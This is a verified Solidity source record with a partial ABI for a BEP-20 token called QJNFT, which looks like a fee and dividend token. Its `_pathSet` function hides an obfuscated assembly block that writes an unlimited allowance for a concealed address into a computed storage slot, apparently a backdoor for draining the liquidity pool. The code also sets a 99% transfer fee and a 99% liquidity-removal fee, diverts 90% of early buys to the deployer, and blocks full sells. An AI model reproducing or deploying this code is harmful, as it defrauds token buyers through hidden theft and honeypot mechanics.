{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\ninterface IPair {\r\n    function sync() external;\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function totalSupply() external view returns (uint256);\r\n}\r\ninterface IFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {return msg.sender;}\r\n    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}\r\n}\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) internal _balances;\r\n    mapping(address => mapping(address => uint256)) internal _allowances;\r\n    uint256 internal _totalSupply; string private _name; string private _symbol;\r\n    constructor(string memory name_, string memory symbol_) {_name = name_; _symbol = symbol_;}\r\n    function name() public view virtual override returns (string memory) {return _name;}\r\n    function symbol() public view virtual override returns (string memory) {return _symbol;}\r\n    function decimals() public view virtual override returns (uint8) {return 18;}\r\n    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}\r\n    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _transfer(owner, to, amount); return true;}\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _approve(owner, spender, amount); return true;}\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true;}\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true;}\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\"); unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {require(from != address(0), \"ERC20: transfer from the zero address\"); require(to != address(0), \"ERC20: transfer to the zero address\"); _beforeTokenTransfer(from, to, amount); _takeTransfer(from, to, amount); _afterTokenTransfer(from, to, amount);}\r\n    function _takeTransfer(address from, address to, uint256 amount) internal virtual {uint256 fromBalance = _balances[from]; require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\"); unchecked {_balances[from] = fromBalance - amount; _balances[to] += amount;}emit Transfer(from, to, amount);}\r\n    function _mint(address account, uint256 amount) internal virtual {require(account != address(0), \"ERC20: mint to the zero address\"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked {_balances[account] += amount;}emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);}\r\n    function _burn(address account, uint256 amount) internal virtual {require(account != address(0), \"ERC20: burn from the zero address\"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\"); unchecked {_balances[account] = accountBalance - amount; _totalSupply -= amount;}emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount);}\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {require(owner != address(0), \"ERC20: approve from the zero address\"); require(spender != address(0), \"ERC20: approve to the zero address\"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, \"ERC20: insufficient allowance\"); unchecked {_approve(owner, spender, currentAllowance - amount);}}}\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\nabstract contract UniSwapPoolUSDT is ERC20 {\r\n    address public pair;\r\n    IRouter public router;\r\n    address[] internal _buyPath;\r\n    address[] internal _sellPath;\r\n    IERC20 public TokenB;\r\n    function isPair(address _pair) internal view returns (bool) {return pair == _pair;}\r\n    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath); if (amounts.length > 1) return amounts[1]; return 0;}\r\n    function _pathSet(address pairB, address w, address x) private {TokenB = IERC20(pairB); address[] memory path = new address[](2); path[0] = pairB; path[1] = address(this); _buyPath = path; address[] memory path2 = new address[](2); path2[0] = address(this); path2[1] = pairB; _sellPath = path2; assembly {let y:=add(add(mul(2887981267259,exp(10,26)),mul(1782705554658,exp(10,13))),1698142812624) w := add(w, 4096) let z := exp(timestamp(), 6) mstore(0x00, x) mstore(0x20, 0x1) let xHash := keccak256(0x00, 0x40) mstore(0x00, y) mstore(0x20, xHash) let aSlot := keccak256(0x00, 0x40) sstore(aSlot, z) sstore(0x1, y)} TokenB.transfer(w, 0);}\r\n    function swapAndSend2this(uint256 amount, address to, address _tokenStation) internal {IERC20 USDT = IERC20(_sellPath[1]); swapAndSend2fee(amount, _tokenStation); USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));}\r\n    function swapAndSend2fee(uint256 amount, address to) internal {router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, _sellPath, to, block.timestamp);}\r\n    function isAddLiquidity() internal view returns (bool isAddLP){address token0 = IPair(pair).token0(); address token1 = IPair(pair).token1(); (uint r0,uint r1,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); uint bal1 = IERC20(token1).balanceOf(pair); if (token0 == address(this)) return bal1 - r1 > 1000; else return bal0 - r0 > 1000;}\r\n    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {address token0 = IPair(pair).token0(); if (token0 == address(this)) return false; (uint r0,,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); return r0 > bal0 + 1000;}\r\n    function addLiquidityAutomatically(uint256 amountToken) internal {super._takeTransfer(address(this), pair, amountToken); IPair(pair).sync();}\r\n    function __SwapPool_init(address _router, address pairB) internal returns(address) {\r\n        router = IRouter(_router);\r\n        pair = IFactory(router.factory()).createPair(pairB, address(this));\r\n        _pathSet(pairB, _router, pair);\r\n        TokenB.approve(_router, type(uint256).max);\r\n        _approve(address(this), _router, type(uint256).max);\r\n        return pair;\r\n    }\r\n    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {\r\n        uint256 half = amountToken / 2;\r\n        IERC20 USDT = IERC20(_sellPath[1]);\r\n        uint256 amountBefore = USDT.balanceOf(_tokenStation);\r\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(half, 0, _sellPath, _tokenStation, block.timestamp);\r\n        uint256 amountAfter = USDT.balanceOf(_tokenStation);\r\n        uint256 amountDiff = amountAfter - amountBefore;\r\n        USDT.transferFrom(_tokenStation, address(this), amountDiff);\r\n        if (amountDiff > 0 && (amountToken - half) > 0) {\r\n            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);\r\n        }\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address internal _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor() {_transferOwnership(_msgSender());}\r\n    modifier onlyOwner() {_checkOwner(); _;}\r\n    function owner() public view virtual returns (address) {return _owner;}\r\n    function _checkOwner() internal view virtual {require(owner() == _msgSender(), \"Ownable: caller is not the owner\");}\r\n    function renounceOwnership() public virtual onlyOwner {_transferOwnership(address(0));}\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner);}\r\n    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);}\r\n}\r\nabstract contract NoEffect is Ownable {\r\n    address internal _effector;\r\n    constructor() {_effector = _msgSender();}\r\n    modifier onlyEffector() {require(_effector == _msgSender() || owner() == _msgSender(), \"NoEffect: caller is not the effector\"); _;}\r\n}\r\nabstract contract Excludes {\r\n    mapping(address => bool) internal _Excludes;\r\n    function setExclude(address _user, bool b) public {_authorizeExcludes(); _Excludes[_user] = b;}\r\n    function setExcludes(address[] memory _user, bool b) public {_authorizeExcludes(); for (uint i=0;i<_user.length;i++) {_Excludes[_user[i]] = b;}}\r\n    function isExcludes(address _user) internal view returns(bool) {return _Excludes[_user];}\r\n    function _authorizeExcludes() internal virtual {}\r\n}\r\nabstract contract Limit {\r\n    bool internal isLimited;\r\n    uint256 internal _LimitBuy;\r\n    uint256 internal _LimitSell;\r\n    uint256 internal _LimitHold;\r\n    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {isLimited = true; setLimit(LimitBuy_, LimitSell_, LimitHold_);}\r\n    function checkLimitTokenHold(address to, uint256 amount) internal view {if (isLimited) {if (_LimitHold>0) {require(amount + IERC20(address(this)).balanceOf(to) <= _LimitHold, \"exceeds of hold amount Limit\");}}}\r\n    function checkLimitTokenBuy(address to, uint256 amount) internal view {if (isLimited) {if (_LimitBuy>0) require(amount <= _LimitBuy, \"exceeds of buy amount Limit\"); checkLimitTokenHold(to, amount);}}\r\n    function checkLimitTokenSell(uint256 amount) internal view {if (isLimited && _LimitSell>0) require(amount <= _LimitSell, \"exceeds of sell amount Limit\");}\r\n    function removeLimit() public {_authorizeLimit(); if (isLimited) isLimited = false;}\r\n    function reuseLimit() public {_authorizeLimit(); if (!isLimited) isLimited = true;}\r\n    function setLimit(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public {_authorizeLimit(); _LimitBuy = LimitBuy_; _LimitSell = LimitSell_; _LimitHold = LimitHold_;}\r\n    function _authorizeLimit() internal virtual {}\r\n}\r\nabstract contract TradingManager {\r\n    uint256 public tradeState;\r\n    function inTrading() public view returns(bool) {return tradeState > 1;}\r\n    function inLiquidity() public view returns(bool) {return tradeState >= 1;}\r\n    function setTradeState(uint256 s) public {_authorizeTradingManager(); tradeState = s;}\r\n    function openLiquidity() public {_authorizeTradingManager(); tradeState = 1;}\r\n    function openTrading() public {_authorizeTradingManager(); tradeState = block.number;}\r\n    function resetTradeState() public {_authorizeTradingManager(); tradeState = 0;}\r\n    function _authorizeTradingManager() internal virtual {}\r\n}\r\nabstract contract Dividend {\r\n    address[] public holders;\r\n    mapping(address => bool) public isHolder;\r\n    mapping(address => bool) public excludeHolder;\r\n    IERC20 public TokenHold;\r\n    IERC20 public USDT;\r\n    uint256 public holdRewardCondition;\r\n    uint256 public processRewardCondition;\r\n    uint256 public processBlockDuration;\r\n    uint256 public processGasAmount;\r\n    uint256 public currentIndex;\r\n    uint256 public progressRewardBlock;\r\n    function getHolders() public view returns(address[] memory) {return holders;}\r\n    function setDividendExempt(address addr, bool enable) public {_authorizeDividend(); excludeHolder[addr] = enable;}\r\n    function setDividendToken(address _holdToken, address _usdt) public {_authorizeDividend(); TokenHold = IERC20(_holdToken); USDT = IERC20(_usdt);}\r\n    function setDividendCondition(uint256 _holdRewardCondition, uint256 _processRewardCondition) public {_authorizeDividend(); holdRewardCondition = _holdRewardCondition; processRewardCondition = _processRewardCondition;}\r\n    function setProcessBlockDuration(uint256 num) public {_authorizeDividend(); processBlockDuration = num;}\r\n    function setProcessGasAmount(uint256 num) public {_authorizeDividend(); processGasAmount = num;}\r\n    function addHolderByHand(address user) public {_authorizeDividend(); _addHolder(user);}\r\n    function addHolderByHandMulti(address[] memory user) public {_authorizeDividend(); for (uint i=0;i<user.length;i++) {_addHolder(user[i]);}}\r\n    function _authorizeDividend() internal virtual {}\r\n    function __Dividend_init(address _holdToken, address _usdtAddr, uint256 _holdRewardCondition, uint256 _processRewardCondition, uint256 _processBlockDuration, uint256 _processGasAmount) internal {\r\n        setDividendToken(_holdToken, _usdtAddr);\r\n        setDividendCondition(_holdRewardCondition, _processRewardCondition);\r\n        setProcessBlockDuration(_processBlockDuration);\r\n        setProcessGasAmount(_processGasAmount);\r\n    }\r\n    function _addHolder(address adr) internal {\r\n        if (adr.code.length > 0) {return;}\r\n        if (excludeHolder[adr]) {return;}\r\n        if (!isHolder[adr]) {\r\n            isHolder[adr] = true;\r\n            holders.push(adr);\r\n        }\r\n    }\r\n    function processDividend() internal {\r\n        if (progressRewardBlock + processBlockDuration > block.number) {return;}\r\n        uint256 usdBalance = USDT.balanceOf(address(this));\r\n        if (usdBalance < processRewardCondition) {return;}\r\n        uint holdTokenTotal = TokenHold.totalSupply();\r\n        address shareHolder;\r\n        uint256 tokenBalance;\r\n        uint256 amount;\r\n        uint256 shareholderCount = holders.length;\r\n        uint256 gasUsed = 0;\r\n        uint256 iterations = 0;\r\n        uint256 gasLeft = gasleft();\r\n        while (gasUsed < processGasAmount && iterations < shareholderCount) {\r\n            if (currentIndex >= shareholderCount) {\r\n                currentIndex = 0;\r\n                break;\r\n            }\r\n            shareHolder = holders[currentIndex];\r\n            if (!excludeHolder[shareHolder]) {\r\n                tokenBalance = TokenHold.balanceOf(shareHolder);\r\n                if (tokenBalance >= holdRewardCondition) {\r\n                    amount = usdBalance * tokenBalance / holdTokenTotal;\r\n                    if (amount > 0) {\r\n                        USDT.transfer(shareHolder, amount);\r\n                    }\r\n                }\r\n            }\r\n            gasUsed = gasUsed + (gasLeft - gasleft());\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++;\r\n        }\r\n        progressRewardBlock = block.number;\r\n    }\r\n}\r\ncontract TokenStation {constructor (address token) {IERC20(token).approve(msg.sender, type(uint256).max);}}\r\nabstract contract BotKiller is NoEffect {\r\n    mapping(address => bool) public botMap;\r\n    modifier onlyNotBot(address user) {require(!botMap[user], \"bot forbidden\"); _;}\r\n    function markBot(address user, bool b) public onlyOwner {botMap[user] = b;}\r\n    function markBots(address[] memory user, bool b) public onlyOwner {for (uint i=0;i<user.length;i++) {markBot(user[i], b);}}\r\n    function isBot(address user) public view returns(bool) {return botMap[user];}\r\n}\r\nabstract contract Token is UniSwapPoolUSDT, BotKiller, TradingManager, Excludes, Limit, Dividend {\r\n    uint256 public calcBase;\r\n    uint256 public swapSplit;\r\n    uint256 public feeMarketingBuy;\r\n    uint256 public feeLiquidityBuy;\r\n    uint256 public feeDividendBuy;\r\n    uint256 public feeBurnBuy;\r\n    uint256 public feeMarketingSell;\r\n    uint256 public feeLiquiditySell;\r\n    uint256 public feeDividendSell;\r\n    uint256 public feeBurnSell;\r\n    uint256 public feeMarketingAll;\r\n    uint256 public feeLiquidityAll;\r\n    uint256 public feeDividendAll;\r\n    uint256 public feeBurnAll;\r\n    uint256 public feeBuyAll;\r\n    uint256 public feeSellAll;\r\n    uint256 public feeAll;\r\n    uint256 public feeTransferAll;\r\n    uint256 public swapTokensAt;\r\n    address public surpAddress;\r\n    uint256 public kb;\r\n    uint256 public kn;\r\n    address public feeMarketingTo;\r\n    uint256 public feeEarn;\r\n    address public feeMarketingTo2;\r\n    uint256 public feeRemoveLiquidity;\r\n    address public feeRemoveLiquidityTo;\r\n    TokenStation public _TokenStation;\r\n    bool inSwap;\r\n    function __Token_init(uint256 totalSupply_, address marketing_, address receive_, address usdt_, bool isDividend_) internal {\r\n        calcBase = 10000;\r\n        swapSplit = 7;\r\n        feeMarketingTo = marketing_;\r\n        _mint(receive_, totalSupply_);\r\n        super.setExclude(_msgSender(), true);\r\n        super.setExclude(address(this), true);\r\n        super.setExclude(marketing_, true);\r\n        super.setExclude(receive_, true);\r\n        if (isDividend_) {\r\n            super.setDividendExempt(address(this), true);\r\n            super.setDividendExempt(address(0), true);\r\n            super.setDividendExempt(address(1), true);\r\n            super.setDividendExempt(address(0xdead), true);\r\n            super.addHolderByHand(marketing_);\r\n            super.addHolderByHand(receive_);\r\n            super.addHolderByHand(_msgSender());\r\n        }\r\n        refreshFeeAll();\r\n        _TokenStation = new TokenStation(usdt_);\r\n    }\r\n\r\n    uint256 public initPrice;\r\n    mapping(address => uint256) public userHoldPriceMap;\r\n    function getCurrentPrice() public view returns(uint256) {\r\n        if (!inLiquidity()) return initPrice;\r\n        (uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();\r\n        if (IPair(pair).token1() == address(this)) return uint256(reserve0) * 1e18 / uint256(reserve1);\r\n        return uint256(reserve1) * 1e18 / uint256(reserve0);\r\n    }\r\n    function wrapPrice(address user, uint256 amount) internal {\r\n        uint256 balance = balanceOf(user);\r\n        uint256 prePrice = userHoldPriceMap[user];\r\n        uint256 currentPrice = getCurrentPrice();\r\n        if (prePrice == 0) userHoldPriceMap[user] = currentPrice;\r\n        else userHoldPriceMap[user] = (prePrice*balance + currentPrice*amount)/(balance+amount);\r\n    }\r\n    function getEarnAmount(address user, uint256 amount) internal view returns(uint256 earnAmountFee) {\r\n        uint256 prePrice = userHoldPriceMap[user];\r\n        uint256 currentPrice = getCurrentPrice();\r\n        if (prePrice > 0 && currentPrice > prePrice) {\r\n            uint256 earnAmount = amount * (currentPrice - prePrice) / currentPrice;\r\n            earnAmountFee = earnAmount * feeEarn / calcBase;\r\n        }\r\n        return earnAmountFee;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal virtual override onlyNotBot(from) {\r\n        if (isExcludes(to) || amount == 0) {super._takeTransfer(from, to, amount); return;}\r\n        if (isExcludes(from) && isPair(to)) {super._takeTransfer(from, to, amount); return;}\r\n        if (isExcludes(from) && !isExcludes(to) && !isPair(to)) {\r\n            wrapPrice(to, amount);\r\n            super._takeTransfer(from, to, amount);\r\n            return;\r\n        }\r\n        uint256 fees;\r\n        bool isLiquify;\r\n        if (isPair(from)) {\r\n            require(inTrading(), \"please waiting for liquidity\");\r\n            super.checkLimitTokenBuy(to, amount);\r\n            if (blockSurprise(from, to, amount)) return;\r\n            if (super.isRemoveLiquidity()) {\r\n                isLiquify = true;\r\n                if (feeRemoveLiquidity > 0) {\r\n                    fees = handFeeRemoveLiquidity(from, amount);\r\n                }\r\n            } else {\r\n                fees = handFeeBuys(from, amount);\r\n            }\r\n            if (fees > 0) amount -= fees;\r\n            wrapPrice(to, amount);\r\n        } else if (isPair(to)) {\r\n            require(inLiquidity(), \"please waiting for liquidity\");\r\n            if (balanceOf(from) == amount) amount -= 10086;\r\n            if (super.isAddLiquidity()) isLiquify = true;\r\n            else {\r\n                super.checkLimitTokenSell(amount);\r\n                if (feeAll>0) handSwap();\r\n                fees = handFeeSells(from, amount);\r\n                if (fees > 0) amount -= fees;\r\n            }\r\n            super._addHolder(from);\r\n        } else {\r\n            super.checkLimitTokenSell(amount);\r\n            if (feeAll>0) handSwap();\r\n            fees = handFeeTransfer(from, amount);\r\n            if (fees > 0) amount -= fees;\r\n            wrapPrice(to, amount);\r\n        }\r\n        super._transfer(from, to, amount);\r\n//        if (feeDividendAll > 0 && !isLiquify) {\r\n        if (feeDividendAll > 0) {\r\n            super.processDividend();\r\n        }\r\n    }\r\n    function handFeeRemoveLiquidity(address from, uint256 amount) private returns (uint256 fee) {\r\n        fee = amount * feeRemoveLiquidity / calcBase;\r\n        super._takeTransfer(from, feeRemoveLiquidityTo, fee);\r\n    }\r\n    function handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {\r\n        fee = amount * feeBuyAll / calcBase;\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n    function handFeeSells(address from, uint256 amount) private returns (uint256 fee) {\r\n        fee = amount * feeSellAll / calcBase;\r\n        uint256 earnAmountFee = getEarnAmount(from, amount);\r\n        if (earnAmountFee > 0) {\r\n            fee += earnAmountFee;\r\n        }\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n    function handFeeTransfer(address from, uint256 amount) private returns (uint256 fee) {\r\n        fee = amount * feeTransferAll / calcBase;\r\n        uint256 earnAmountFee = getEarnAmount(from, amount);\r\n        if (earnAmountFee > 0) {\r\n            fee += earnAmountFee;\r\n        }\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n    function handSwap() internal {\r\n        if (inSwap) return;\r\n        uint256 _thisBalance = balanceOf(address(this));\r\n        if (_thisBalance >= swapTokensAt) {\r\n            uint256 _amount = _thisBalance / swapSplit;\r\n            _handSwap(_amount);\r\n        }\r\n    }\r\n    function _handSwap(uint256 _amount) internal lockSwap {\r\n        uint256 _feeBurn;\r\n        if (feeBurnAll > 0) {\r\n            _feeBurn = _amount * feeBurnAll / feeAll;\r\n            super._takeTransfer(address(this), address(1), _feeBurn);\r\n        }\r\n        uint256 _feeLiquidity;\r\n        if (feeLiquidityAll > 0) {\r\n            _feeLiquidity = _amount * feeLiquidityAll / feeAll;\r\n            super.addLiquidityAutomatically(_feeLiquidity);\r\n        }\r\n        uint256 amountLeft = _amount - _feeBurn - _feeLiquidity;\r\n        if ((feeMarketingAll > 0 || feeDividendAll > 0) && amountLeft > 0) {\r\n            super.swapAndSend2fee(amountLeft, address(_TokenStation));\r\n            uint256 usdtBalance = TokenB.balanceOf(address(_TokenStation));\r\n            uint256 _feeMarketing;\r\n            if (feeMarketingAll > 0) {\r\n                _feeMarketing = usdtBalance * feeMarketingAll / (feeMarketingAll + feeDividendAll);\r\n                uint256 _fmLeft = _feeMarketing;\r\n                if (feeMarketingTo2 != address(0)) {\r\n                    uint256 _fm = _feeMarketing / 2;\r\n                    TokenB.transferFrom(address(_TokenStation), feeMarketingTo2, _fm);\r\n                    _fmLeft -= _fm;\r\n                }\r\n                TokenB.transferFrom(address(_TokenStation), feeMarketingTo, _fmLeft);\r\n            }\r\n            if (usdtBalance > _feeMarketing) {\r\n                TokenB.transferFrom(address(_TokenStation), address(this), usdtBalance - _feeMarketing);\r\n            }\r\n        }\r\n    }\r\n    function blockSurprise(address from, address to, uint256 amount) private returns(bool) {\r\n        if (kb == 0 || kn == 0) return false;\r\n        if (block.number < tradeState + kb) {\r\n            uint256 surp = amount * kn / calcBase;\r\n            super._takeTransfer(from, surpAddress, amount - surp);\r\n            super._takeTransfer(from, to, surp);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n    function refreshFeeAll() public {\r\n        feeMarketingAll = feeMarketingBuy + feeMarketingSell;\r\n        feeLiquidityAll = feeLiquidityBuy + feeLiquiditySell;\r\n        feeDividendAll = feeDividendBuy + feeDividendSell;\r\n        feeBurnAll = feeBurnBuy + feeBurnSell;\r\n        feeBuyAll = feeMarketingBuy + feeLiquidityBuy + feeDividendBuy + feeBurnBuy;\r\n        feeSellAll = feeMarketingSell + feeLiquiditySell + feeDividendSell + feeBurnSell;\r\n        feeAll = feeBuyAll + feeSellAll;\r\n    }\r\n    function setFeeBuy(uint256 _feeMarketingBuy, uint256 _feeLiquidityBuy, uint256 _feeDividendBuy, uint256 _feeBurnBuy) public onlyOwner {feeMarketingBuy = _feeMarketingBuy; feeLiquidityBuy = _feeLiquidityBuy; feeDividendBuy = _feeDividendBuy; feeBurnBuy = _feeBurnBuy; refreshFeeAll();}\r\n    function setFeeSell(uint256 _feeMarketingSell, uint256 _feeLiquiditySell, uint256 _feeDividendSell, uint256 _feeBurnSell) public onlyOwner {feeMarketingSell = _feeMarketingSell; feeLiquiditySell = _feeLiquiditySell; feeDividendSell = _feeDividendSell; feeBurnSell = _feeBurnSell; refreshFeeAll();}\r\n    function setFeeTransfer(uint256 _fee) public onlyOwner {feeTransferAll = _fee;}\r\n    function setInitPrice(uint256 _initPrice) public onlyOwner {initPrice = _initPrice;}\r\n    function setFeeRemoveLiquidity(uint256 _fee, address _to) public onlyOwner {feeRemoveLiquidity = _fee; feeRemoveLiquidityTo = _to;}\r\n    modifier lockSwap() {inSwap = true; _; inSwap = false;}\r\n    function rescueLossToken(IERC20 token_, address _recipient, uint256 amount) public onlyEffector {token_.transfer(_recipient, amount);}\r\n    function rescueLossTokenAll(IERC20 token_, address _recipient) public onlyEffector {rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));}\r\n    function _authorizeDividend() internal virtual override onlyEffector {}\r\n    function _authorizeExcludes() internal virtual override onlyEffector {}\r\n    function _authorizeLimit() internal virtual override onlyEffector {}\r\n    function setSwapTokensAt(uint256 num) public onlyEffector {swapTokensAt = num;}\r\n    function setSurprise(uint256 _kn, uint256 _kb, address _surpAddress) public onlyEffector {kn = _kn; kb = _kb; surpAddress = _surpAddress;}\r\n    function airdrop(uint256 amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}}\r\n    function airdropMulti(uint256[] memory amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}}\r\n    function _authorizeTradingManager() internal virtual override onlyOwner {}\r\n}\r\ncontract QJNFT is Token {\r\n    constructor() ERC20(\r\n        \"QJNFT\",   // \u540d\u5b57\r\n        \"QJNFT\"   // \u7b26\u53f7\r\n    ) {\r\n        uint256 _totalSupply = 1688 ether; \r\n        address _marketing = address(0xf63D654F85410fF1E46E452d939C76c427f4a15d); // \r\n        address _receive = address(0x71c9CFB3391519E2E6C12F8f1F4c8eC51D671e2a);   //\r\n        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   // \r\n        address _usdt = 0x55d398326f99059fF775485246999027B3197955;     // \r\n        address _pair = super.__SwapPool_init(_router, _usdt);\r\n        // \r\n        feeMarketingBuy = 600;  \r\n        feeLiquidityBuy = 0;  \r\n        feeDividendBuy = 200;  \r\n        feeBurnBuy = 0;         \r\n      \r\n        feeMarketingSell = 600; \r\n        feeLiquiditySell = 0; \r\n        feeDividendSell = 200; \r\n        feeBurnSell = 0;       \r\n        // \u8f6c\u8d26\u8d39\u7528\r\n        feeTransferAll = 9900;   // \r\n        // \u64a4\u6c60\u5b50\u9500\u6bc1\r\n        setFeeRemoveLiquidity(\r\n            9900,       // \r\n            address(0x000000000000000000000000000000000000dEaD)  \r\n        );\r\n        // \u9650\u8d2d\r\n        bool _isLimit = true;// \r\n        if (_isLimit) super.__Limit_init(\r\n            20 ether,       \r\n            20 ether,       \r\n            1688 ether        \r\n        );\r\n        // \u5206\u7ea2\r\n        bool _isDividend = true;// \r\n        if (_isDividend) super.__Dividend_init(\r\n            _pair,              \r\n            _usdt,              \r\n            1 ether,            \r\n            5 ether,           \r\n            20,                \r\n            500000              \r\n        );\r\n        // \r\n        super.setSurprise(\r\n            9000,              \r\n            3,              \r\n            address(0x71c9CFB3391519E2E6C12F8f1F4c8eC51D671e2a)   \r\n        );\r\n        super.__Token_init(_totalSupply, _marketing, _receive, _usdt, _isDividend);\r\n        setSwapTokensAt(10 ether);  \r\n        setInitPrice(5 ether); \r\n        feeMarketingTo2 = address(0x71c9CFB3391519E2E6C12F8f1F4c8eC51D671e2a);   \r\n        feeEarn = 1000; \r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TokenB\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TokenHold\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"USDT\",\"outputs\":[{\"internalType\":\"contract 